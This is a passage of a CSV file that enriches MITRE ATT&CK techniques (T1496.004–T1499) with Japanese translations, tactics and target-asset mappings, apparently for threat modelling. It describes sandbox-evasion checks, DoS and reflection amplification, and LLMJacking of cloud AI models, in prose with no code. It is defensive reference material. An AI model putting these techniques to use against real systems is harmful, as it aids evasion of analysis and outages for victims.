Detection 2024）。大量のリクエストに対応するため、SMSコストが増加し、通信チャネルが過負荷状態になる可能性があります（引用元：Twilio SMS Pumping）。,impact,SaaS,credential_abuse,impact,authentication_system;mfa_in_use,specified,File Server;My Number Administrative System on GovCloud,subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--130d4494-b2d6-4040-bcea-6e59f05222fe,2024-09-25T13:53:19.586Z,2025-04-15T23:02:00.718Z,,,,
T1496.004,T1496,Cloud Service Hijacking,クラウドサービス乗っ取り,"Adversaries may leverage compromised software-as-a-service (SaaS) applications to complete resource-intensive tasks, which may impact hosted service availability. For example, adversaries may leverage email and messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification Service (SNS), SendGrid, and Twilio, in order to send large quantities of spam / [Phishing](https://attack.mitre.org/techniques/T1566) emails and SMS messages.(Citation: Invictus IR DangerDev 2024)(Citation: Permiso SES Abuse 2023)(Citation: SentinelLabs SNS Sender 2024) Alternatively, they may engage in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted AI models.(Citation: Sysdig LLMJacking 2024)(Citation: Lacework LLMJacking 2024) In some cases, adversaries may leverage services that the victim is already using. In others, particularly when the service is part of a larger cloud platform, they may first enable the service.(Citation: Sysdig LLMJacking 2024) Leveraging SaaS applications may cause the victim to incur significant financial costs, use up service quotas, and otherwise impact availability.",攻撃者は、侵害されたSaaS（Software-as-a-Service）アプリケーションを利用して、リソースを大量に消費するタスクを実行し、ホストされているサービスの可用性に影響を与える可能性があります。 例えば、攻撃者はAWS Simple Email Service (SES)、AWS Simple Notification Service (SNS)、SendGrid、Twilioなどのメール・メッセージングサービスを利用して、大量のスパム／[フィッシング](https://attack.mitre.org/techniques/T1566)メールやSMSを送信する可能性があります。(引用元: Invictus IR DangerDev 2024)(引用元: Permiso SES Abuse 2023)(引用元: SentinelLabs SNS Sender 2024) あるいは、リバースプロキシを悪用してクラウドホスト型AIモデルの能力を乗っ取るLLMJackingを行う可能性もある。(引用元: Sysdig LLMJacking 2024)(引用: Lacework LLMJacking 2024) 場合によっては、攻撃者は被害者が既に利用しているサービスを利用する。特にサービスがより大規模なクラウドプラットフォームの一部である場合、攻撃者はまずそのサービスを有効化することもある。(引用: Sysdig LLMJacking 2024) SaaSアプリケーションの悪用は、被害者に多額の金銭的損失をもたらし、サービス利用枠を消費させ、可用性に悪影響を及ぼす可能性がある。,impact,SaaS,destructive_impact,impact,user_interaction;email_infrastructure;cloud_control_plane;saas_in_use,specified,File Server;Mail / Collaboration;My Number Administrative System on GovCloud,subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--924d273c-be0d-4d8d-af58-2dddb15ef1e2,2024-09-25T14:05:59.910Z,2025-04-15T22:03:40.356Z,,,,
T1497,,Virtualization/Sandbox Evasion,仮想化/サンドボックス回避,"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness) Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)",攻撃者は仮想化環境や分析環境を検知・回避するため、様々な手段を用いる。これには仮想マシン環境（VME）やサンドボックスの存在を示すアーティファクトのチェック結果に基づく動作変更が含まれる。攻撃者がVMEを検知した場合、マルウェアを改変して被害者から離脱したり、インプラントの核心機能を隠蔽したりする可能性がある。また二次ペイロードや追加ペイロードをドロップする前にVMEアーティファクトを検索することもある。 攻撃者は自動検出時に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から得た情報を基に、その後の動作を調整することがある。(引用元: Deloitte Environment Awareness) 攻撃者は、セキュリティ監視ツール（例: Sysinternals、Wiresharkなど）や分析・仮想化に関連するその他のシステム痕跡をチェックするなど、[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)を達成するために複数の手法を用いる可能性があります。 攻撃者はまた、正当なユーザー活動を監視し、分析環境下にあるかどうかを判断しようとする。その他の手法には、一時的なサンドボックス内での動作を回避するため、マルウェアコード内にスリープタイマーやループを組み込む方法が含まれる。(引用元: Unit 42 Pirpi July 2015),defense-evasion;discovery,Windows;macOS;Linux,defense_disable,stealth,authentication_system;user_interaction;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0007,attack-pattern--82caa33e-d11a-433a-94ea-9b5a5fbef81d,2019-04-17T22:22:24.505Z,2025-04-15T19:58:47.123Z,,,,
T1497.001,T1497,System Checks,システムチェック,"Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness) Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks into one script and then have the program exit if it determines the system to be a virtual environment. Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`. Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)",攻撃者は仮想化環境や分析環境を検知・回避するため、様々なシステムチェックを実施する可能性がある。これには仮想マシン環境（VME）やサンドボックスの存在を示す痕跡の有無を検査した結果に基づき、動作を変更する手法が含まれる。攻撃者がVMEを検知した場合、マルウェアを改変して被害者から離脱したり、埋め込み型マルウェアの核心機能を隠蔽したりする可能性がある。また、二次ペイロードや追加ペイロードを投入する前にVMEの痕跡を調査する場合もある。 攻撃者は自動探索時に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から得た情報を基に、後続の動作を調整することがある。（引用元：Deloitte Environment Awareness）具体的なチェック内容は標的や攻撃者によって異なるが、[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)、 [PowerShell](https://attack.mitre.org/techniques/T1059/001)、[システム情報収集](https://attack.mitre.org/techniques/T1082)、[レジストリ照会](https://attack.mitre.org/techniques/T1012) などの動作が含まれる。 攻撃者は、メモリ、プロセス、ファイルシステム、ハードウェア、および/またはレジストリ内でVMEアーティファクトを検索する可能性があります。攻撃者はスクリプトを使用してこれらのチェックを単一スクリプトに自動化し、システムが仮想環境であると判断した場合にプログラムを終了させる場合があります。チェックには、ホスト名/ドメイン名などの汎用システムプロパティやネットワークトラフィックのサンプルが含まれる可能性があります。 攻撃者はネットワークアダプタのアドレス、CPUコア数、利用可能なメモリ/ドライブ容量も確認する可能性がある。マルウェアは実行後、[ファイルとディレクトリの検出](https://attack.mitre.org/techniques/T1083)を用いて、`malware`、`sample`、`hash`といった予期せぬ命名規則や分析関連の命名規則が用いられたフォルダやファイルに保存されていないかを確認する場合もある。 その他の一般的なチェックには、これらのアプリケーション固有の実行中サービスの列挙、システムにインストールされたプログラムの確認、仮想マシンアプリケーションに関連する文字列の製造元/製品フィールドの調査、VME固有のハードウェア/プロセッサ命令の検出が含まれる（出典: McAfee Virtual Jan 2017）。VMWareのようなアプリケーションでは、攻撃者は特殊なI/Oポートを使用してコマンド送信や出力受信を行うことも可能である。 ファン、温度、オーディオデバイスの存在といったハードウェアチェックも、仮想環境を示す証拠収集に利用可能です。攻撃者はこれらのデバイスから特定の測定値を問い合わせる場合もあります。（引用元：Unit 42 OilRig 2018年9月）,defense-evasion;discovery,Linux;macOS;Windows,script_command_execution,stealth,authentication_system;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0007,attack-pattern--29be378d-262d-4e99-b00d-852d573628e6,2020-03-06T20:57:37.959Z,2025-04-15T19:58:16.253Z,,,,
T1497.002,T1497,User Activity Based Checks,ユーザー活動に基づくチェック,"Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness) Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017)",攻撃者は仮想化環境や分析環境を検知・回避するため、様々なユーザー活動チェックを実施する可能性がある。これには仮想マシン環境（VME）やサンドボックスを示すアーティファクトの存在チェック結果に基づく動作変更が含まれる。攻撃者がVMEを検知した場合、マルウェアを改変して被害者から離脱したり、インプラントのコア機能を隠蔽したりする可能性がある。また二次ペイロードや追加ペイロードをドロップする前にVMEアーティファクトを検索することもある。 攻撃者は自動検出時に[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)から得た情報を基に、後続の動作を調整することがある。(引用元: Deloitte Environment Awareness) 攻撃者は、マウス操作やクリックの速度/頻度(引用元: Sans Virtual Jan 2016)、ブラウザ履歴、キャッシュ、ブックマーク、ホームディレクトリやデスクトップなどの共通ディレクトリ内のファイル数といった変数に基づき、ホスト上のユーザー活動を調査する可能性がある。 その他の手法では、悪意のあるコードが起動される前に、システムに対する特定のユーザー操作を依存する場合があります。例えば、マクロを起動する前にドキュメントが閉じるのを待機する（引用元：Unit 42 Sofacy 2018年11月）や、埋め込み画像をダブルクリックして起動するのを待機する（引用元：FireEye FIN7 2017年4月）などです。,defense-evasion;discovery,Linux;macOS;Windows,data_collection,stealth,user_interaction;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0007,attack-pattern--91541e7e-b969-40c6-bbd8-1b5352ec2938,2020-03-06T21:04:12.454Z,2025-04-15T19:58:51.123Z,,,,
T1497.003,T1497,Time Based Evasion,時間ベース回避,"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time. Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness) Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot) Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)",攻撃者は仮想化環境や分析環境を検知・回避するため、様々な時間ベースの手法を採用する可能性がある。これには稼働時間やシステムクロックなどの時間ベースのプロパティの列挙、あるいはタイマーやその他のトリガーを用いた仮想マシン環境（VME）やサンドボックスの回避が含まれ、特に自動化されたものや限定時間のみ動作する手法が対象となる。 攻撃者は、プログラム的なスリープコマンドやネイティブシステムスケジューリング機能（例：[Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)）を使用して、マルウェアの初期実行時の機能を遅延させるなど、様々な時間ベースの回避策を採用する可能性がある。 遅延は、特定の被害者条件（例：システム時刻、イベントなど）が満たされるのを待つことに基づく場合や、分析や精査を回避するためにスケジュールされた[多段階チャネル](https://attack.mitre.org/techniques/T1104)を採用する場合もある。（引用元：Deloitte Environment Awareness）マルウェアの実行を遅延させるために、無害なコマンドやその他の操作が使用される場合もある。 ループや、[Ping](https://attack.mitre.org/software/S0097)などの不要なコマンドの繰り返しは、マルウェアの実行を遅延させ、自動分析環境の時間制限を超える可能性もある。(引用元: Revil Independence Day)(引用元: Netskope Nitol) 別の手法として、APIハンマー攻撃と呼ばれるものがある。これは実行を遅延させるため（同時に分析環境に不要なデータを過剰に送り込む可能性もある）、[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数に対して様々な呼び出しを行うものである。(引用元: Joe Sec Nymaim)(引用: Joe Sec Trickbot) 攻撃者は、特に時間メカニズムを操作して経過時間を長く見せかけるサンドボックスや分析環境を検出する指標として時間を活用する場合もある。例えば、スリープ関数実行前後の環境タイムスタンプをサンプリング・計算することで、時間を加速するサンドボックスを特定できる可能性がある。(引用: ISACA Malware Tricks),defense-evasion;discovery,Linux;macOS;Windows,script_command_execution,stealth,endpoint_execution;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0007,attack-pattern--4bed873f-0b7d-41d4-b93a-b6905d1f90b0,2020-03-06T21:11:11.225Z,2025-04-15T19:58:29.032Z,,,,
T1498,,Network Denial of Service,ネットワーク・サービス拒否,"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014) A Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS). To perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets. Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices. For DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",攻撃者は、標的リソースの可用性を低下または遮断するため、ネットワークサービス拒否（DoS）攻撃を実行する可能性がある。ネットワークDoSは、サービスが依存するネットワーク帯域幅を枯渇させることで実行される。対象リソースの例には、特定のウェブサイト、メールサービス、DNS、ウェブベースアプリケーションが含まれる。 攻撃者は、政治的目的（引用元：FireEye OpPoisonedHandover 2016年2月）や、注意散漫（引用元：FSISAC FraudNetDoS 2012年9月）、ハクティビズム、恐喝などの他の悪意ある活動を支援するために、ネットワークDoS攻撃を実施していることが確認されている。（出典：Symantec DDoS 2014年10月）ネットワークDoSは、リソース自体、あるいはリソースが依存するネットワーク接続・ネットワーク機器に向けられた悪意のあるトラフィックの量により、システムへのネットワーク接続帯域幅容量が枯渇した際に発生します。例えば、インターネットへの接続が1Gbpsのネットワークでホストされているサーバーに対し、攻撃者が10Gbpsのトラフィックを送信する場合が挙げられます。 このトラフィックは単一システム、またはインターネット上に分散した複数システムによって生成され、後者は分散型DoS（DDoS）として一般的に呼ばれる。ネットワークDoS攻撃を実行するには、IPアドレス偽装やボットネットを含む複数の手法に共通する要素が適用される。攻撃者は攻撃システムの元のIPアドレスを使用するか、送信元IPアドレスを偽装して攻撃トラフィックの追跡を困難にしたり、リフレクション攻撃を可能にしたりする。 これにより、ネットワーク防御装置における送信元アドレスによるフィルタリングの有効性が低下または無効化され、防御側の攻撃対策が困難になる。ホスティングシステムを直接標的とするDoS攻撃については、[エンドポイントサービス拒否](https://attack.mitre.org/techniques/T1499)を参照のこと。,impact,Windows;IaaS;Linux;macOS;Containers,destructive_impact,impact,user_interaction;network_connectivity;email_infrastructure,specified,Business Workstation;File Server;Mail / Collaboration;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab,2019-04-17T20:23:15.105Z,2025-04-15T22:51:06.430Z,,,,
T1498.001,T1498,Direct Network Flood,直接ネットワークフラッド,"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well. Botnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",攻撃者は、標的に大量のネットワークトラフィックを直接送信することでサービス拒否（DoS）を引き起こそうとする場合があります。このDoS攻撃は、標的システムやネットワークの可用性および機能性を低下させる可能性もあります。 [直接ネットワークフラッド](https://attack.mitre.org/techniques/T1498/001)とは、1つ以上のシステムを用いて標的サービスのネットワークに向けて大量のネットワークパケットを送信する攻撃を指す。 フラッディングにはほぼあらゆるネットワークプロトコルが利用可能です。UDPやICMPなどのステートレスプロトコルが一般的に使用されますが、TCPなどのステートフルプロトコルも使用可能です。ネットワークやサービスに対するネットワークフラッディング攻撃には、ボットネットが一般的に利用されます。 大規模なボットネットは、世界中のインターネットに分散したシステムから膨大なトラフィックを生成できる。攻撃者は独自のボットネットインフラを構築・制御するリソースを持つ場合もあれば、既存のボットネットをレンタルして攻撃を実行する場合もある。分散型サービス拒否（DDoS）攻撃の最悪のケースでは、非常に多くのシステムがフラッディングに利用されるため、各システムが送信するトラフィック量はわずかでも、標的ネットワークを飽和させる十分な量を生み出す。 このような状況では、DDoSトラフィックと正当なクライアントを区別することは極めて困難になる。ボットネットは、2012年に米国の主要銀行を標的とした一連の事件など、最も注目を集めたDDoSフラッディング攻撃の一部で使用されてきた。（引用元：USNYAG IranianBotnet 2016年3月）,impact,Windows;IaaS;Linux;macOS,destructive_impact,impact,network_connectivity;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3,2020-03-02T20:07:18.651Z,2025-04-15T22:19:07.343Z,,,,
T1498.002,T1498,Reflection Amplification,反射増幅,"Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018) In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)","攻撃者は、大量のネットワークトラフィックを標的に反射させることでサービス拒否（DoS）を引き起こそうとする。この種のネットワークDoSは、特定の偽装送信元IPアドレスをホストし応答する第三者サーバー（リフレクター）を悪用する。攻撃者は、被害者の偽装アドレスをリフレクターに送信することで反射攻撃を実行する。 直接ネットワークフラッドと同様に、複数のシステムやボットネットが攻撃に利用される可能性がある。同様に、1つ以上のリフレクターが標的にトラフィックを集中させるために使用される。（出典：Cloudflare ReflectionDoS 2017年5月）このネットワークDoS攻撃は、標的システムやネットワークの可用性・機能性を低下させる可能性もある。 反射攻撃は、トラフィックを増幅させるため、要求よりも応答が大きいプロトコルを悪用することが多く、これは一般に反射増幅攻撃として知られている。攻撃者は、増幅器に送信される要求よりも数桁大きい攻撃トラフィックの増加量を生成できる可能性がある。この増加の程度は、対象プロトコル、使用される技術、攻撃量の増幅を実際に生み出す増幅サーバーなど、多くの変数に依存する。 リフレクション増幅フラッドを可能にした代表的なプロトコルはDNS（出典: Cloudflare DNSamplficationDoS）とNTP（出典: Cloudflare NTPamplifciationDoS）であるが、実環境では他にも複数のプロトコルが利用されていることが確認されている。(引用: Arbor AnnualDoSreport Jan 2018) 特にmemcacheプロトコルは、要求パケットの最大51,200倍に達する増幅規模を示す強力なプロトコルであることが判明している。(引用: Cloudflare Memcrashed Feb 2018)",impact,Windows;IaaS;Linux;macOS,data_collection,impact,network_connectivity;cloud_control_plane,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--36b2a1d7-e09e-49bf-b45e-477076c2ec01,2020-03-02T20:08:03.691Z,2025-04-15T22:59:22.782Z,,,,
T1499,,Endpoint Denial of Service,エンドポイント・サービス拒否,"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014) An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS). To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets. Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices. Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016) In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China) For attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",攻撃者はエンドポイントサービス拒否（DoS）攻撃を実行し、ユーザーへのサービス可用性を低下または遮断する可能性がある。エンドポイントDoSは、サービスがホストされているシステムリソースを枯渇させるか、システムを悪用して持続的なクラッシュ状態を引き起こすことで実行される。対象サービスにはウェブサイト、メールサービス、DNS、ウェブベースアプリケーションなどが含まれる。 攻撃者は、政治的目的（引用元：FireEye OpPoisonedHandover 2016年2月）や、注意散漫（引用元：FSISAC FraudNetDoS 2012年9月）、ハクティビズム、恐喝（引用元：Symantec DDoS 2014年10月）などの他の悪意ある活動を支援するためにDoS攻撃を実施していることが確認されている。 エンドポイントDoSは、サービスへのアクセスを提供するネットワークを飽和させることなく、サービスの可用性を拒否します。攻撃者は、サービス提供に使用されるシステム上でホストされるアプリケーションスタックの様々な層を標的とできます。これらの層には、オペレーティングシステム（OS）、Webサーバー、DNSサーバー、データベースなどのサーバーアプリケーション、およびそれらの上に構築される（通常はWebベースの）アプリケーションが含まれます。 各層への攻撃には、それぞれのコンポーネント固有のボトルネックを悪用する異なる手法が必要となる。DoS攻撃は単一システムから、あるいはインターネット上に分散した複数システムから生成される場合があり、後者は分散型DoS（DDoS）として一般的に呼ばれる。エンドポイントリソースに対するDoS攻撃を実行するには、IPアドレス偽装やボットネットなど、複数の手法に共通するいくつかの側面が適用される。 攻撃者は攻撃元のシステム本来のIPアドレスを使用するか、送信元IPアドレスを偽装して攻撃トラフィックの追跡を困難にしたり、リフレクション攻撃を可能にしたりする。これにより、ネットワーク防御装置における送信元アドレスフィルタリングの有効性が低下または無効化され、防御側の攻撃対策が困難になる。ボットネットはネットワークやサービスに対するDDoS攻撃に広く利用される。 大規模なボットネットは、世界中のインターネットに分散したシステムから膨大なトラフィックを生成できる。 攻撃者は独自のボットネットインフラを構築・制御するリソースを有する場合もあれば、既存ボットネットの時間を借りて攻撃を実行する場合もある。最悪のDDoS事例では、膨大な数のシステムがリクエスト生成に利用されるため、各システムが送信するトラフィック量はわずかながら、標的のリソースを枯渇させる十分な規模となる。このような状況下では、正当なクライアントからのトラフィックとDDoSトラフィックを区別することが極めて困難になる。 ボットネットは、2012年に米国の主要銀行を標的とした一連の事件など、最も注目を集めたDDoS攻撃の一部で使用されてきた。（引用元：USNYAG IranianBotnet 2016年3月）トラフィック操作が使用されるケースでは、グローバルネットワーク上の特定のポイント（高トラフィックゲートウェイルーターなど）でパケットが改変され、正当なクライアントにネットワークパケットを標的に大量に送信させるコードを実行させることがある。 この種の機能は、ウェブ検閲の目的で以前に使用されたことがあり、クライアントのHTTPトラフィックが改変され、標的のウェブサーバーを圧倒するDDoSコードを生成するJavaScriptへの参照が含まれるようにされた。（引用元：ArsTechnica Great Firewall of China）提供ネットワークを飽和させようとする攻撃については、[ネットワーク・サービス拒否攻撃](https://attack.mitre.org/techniques/T1498)を参照のこと。,impact,Windows;Linux;macOS;Containers;IaaS,script_command_execution,impact,user_interaction;endpoint_execution;network_connectivity;email_infrastructure;file_storage_access;database_access,specified,Business Workstation;File Server;Mail / Collaboration;My Number Administrative System on GovCloud;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4,2019-04-18T11:00:55.862Z,2025-04-15T22:28:03.155Z,,,,
